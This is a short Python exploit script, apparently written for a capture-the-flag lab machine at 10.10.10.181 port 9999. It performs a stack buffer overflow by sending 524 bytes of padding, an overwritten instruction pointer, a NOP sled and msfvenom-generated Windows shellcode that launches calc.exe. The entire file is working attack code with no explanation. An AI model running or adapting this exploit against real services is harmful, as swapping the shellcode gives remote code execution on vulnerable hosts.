#!/usr/bin/env python3

import socket


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#ip TARGET
s.connect(('10.10.10.181',9999))

#OFFSET EIP
junk = 'A'*524

#JMP ADDRESS
# 31 17 12 f3
eip = '\xF3\x12\x17\x31'

# add nop sled
esp = '\x90'*30
#shellcode here 
#msfvenom -p windows/exec cmd=calc.exe -a x86 -b "\x00" f c
esp += ("\xba\x6f\x91\xde\xc1\xdb\xc9\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
"\x1f\x31\x56\x15\x83\xee\xfc\x03\x56\x11\xe2\x9a\xfb\xd4\x9f"
"\x55\x27\x1f\xfc\xc6\x94\xb3\x69\xea\xaa\x52\xe7\x0b\x07\x1a"
"\x60\x90\xf0\x11\x86\xb4\x95\x4e\x9a\xb8\xb6\xa6\x13\x59\xd2"
"\xd0\x7b\xc9\x72\x4a\xf5\x08\x37\xb9\x85\x4f\x78\x38\x9f\x01"
"\x0d\x86\xf7\x3f\xed\xf8\x07\x67\x84\xf8\x6d\x92\xd1\x1a\x40"
"\x55\x2c\x5c\x26\xa5\xd6\xe0\xc2\x02\x9b\x1c\xac\x4c\xcb\x22"
"\xce\xc5\x08\xe3\x25\xd9\x0f\x07\xb5\x51\xf2\x05\x46\x14\xcd"
"\xee\x57\x4d\x47\xef\xc1\xc3\x73\x40\xf2\xee\xfc\x25\x35\x88"
"\xfe\xda\x57\xd0\xfe\x24\x98\x20\xba\x24\x98\x20\xbc\xeb\x18")


payload = junk + eip + esp
payload = payload.encode('raw_unicode_escape')

s.send(payload)

s.close()